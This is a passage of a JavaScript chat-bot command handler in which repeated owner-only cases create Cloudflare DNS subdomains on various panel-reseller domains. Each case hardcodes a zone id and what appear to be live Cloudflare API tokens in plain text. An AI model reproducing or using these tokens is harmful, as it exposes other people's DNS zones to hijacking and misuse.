           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "invalid ip" : "where is the ip");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
 break
           
     case 'd8': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a0cef62d7194b16e1706f5d48c41129a";
               let apitoken = "_xnkxZ50i8J5p0Y148oSlomu0NoIt2mTGWxu0CsR"
               let tld = "kukurahost.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "invalid ip" : "where is the ip");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
 break 
 
     case 'd9': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5f4a582dd80c518fb2c7a425256fb491";
               let apitoken = "iQbJQgfe6kTyEfdOy_EV8UAHKj80VgQg4t6rTjby"
               let tld = "tokopanellku.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "invalid ip" : "where is the ip");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break


case 'd10': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "15b97d8a42af1c00a70070e577ce7301";
               let apitoken = "RsbJAI6X7s7bPEj23R7sf28cqHibApP1EBSoF4FZ"
               let tld = "kiospanell.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "invalid ip" : "where is the ip");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break
case 'd11': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e60307683c18389584e9ae2f9fa707b2";
               let apitoken = "9hc8x5B4TewRTpXxETV_laVGksk3MyCfBXOgHgmg"
               let tld = "moon-offc.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "invalid ip" : "where is the ip");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break
case 'd12': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ba364ec1df6998c10487aee2a61b7f0d";
               let apitoken = "hnM3i7bBHzcIRXqveYKR3KTnsfrkigkhar2vEUcP"
               let tld = "moon-offc.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "invalid ip" : "where is the ip");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break

case 'd13': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "2feafa10ec4054af7cb04b18515013e5";
               let apitoken = "8WA6BgIuvFO5AL3xJZf3bsM0ts8aIZiFbxj90icK"
               let tld = "tokopanellmurah.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "invalid ip" : "where is the ip");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break


case 'd14': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "2dc001900c742f289eef7dbae7ab784b";
               let apitoken = "RsbJAI6X7s7bPEj23R7sf28cqHibApP1EBSoF4FZ"
               let tld = "bisnispanel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break
                
case  'd15': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "77c6588b3b36e74d07538e62ef91d6ba";
               let apitoken = "SgON4r6174fMe3h3B9wyP3caEtwUIfnVuNvSpl1k"
               let tld = "tokopanel.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "invalid ip" : "where is the ip");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd16': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "4049d75623d46e90d616fdf878a5ed84";
               let apitoken = "qwAWquCm1cqKEzZnZUEuAbfFq3PCOLleQZifxPog"
               let tld = "store-panel.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "invalid ip" : "where is the ip");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd17': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "8080d914883ed0b9e17d281f593df945";
               let apitoken = "BP2uUPgVfrM4pHW_ivo2AawAyiLqOMYoLYyS2BF7"
               let tld = "sellerpanel.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "invalid ip" : "where is the ip");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break

case  'd18': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "cada0ecef8f1e8d904435d469aef1b05";
               let apitoken = "54kx4yvi3CBqomC99WSaqZo9tbxHoe9U-ncBIVMx"
               let tld = "mypanel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd19': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d318f96a6327c5340d136415e860f545";
               let apitoken = "RTe9hBdh_-nt0wzOvYN183JyQC011yaiodQ7Po1b"
               let tld = "kangpanel.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd20': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "8132a433dc4eea653e38e168f2f45fc0";
               let apitoken = "33F2gfJ0cEoLv4NlEqLYGd6Ahc5_dzyUH_ClKuX_"
               let tld = "jasapanel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd21': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5024bc4a02924cf69ddf4dfa6ee96069";
               let apitoken = "OajJ0jtCB0FTFwfdiTB_ktzNKFWAmsENFdlE4Hvd"
               let tld = "dewapanel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break                  
case  'd22': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "98264c6c53c5bc9080230b077422d748";
               let apitoken = "1W9IHC9mLAKj8hQaMjczy0gA3Of7kPjJ3gAvTlnZ"
               let tld = "adminpanel.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
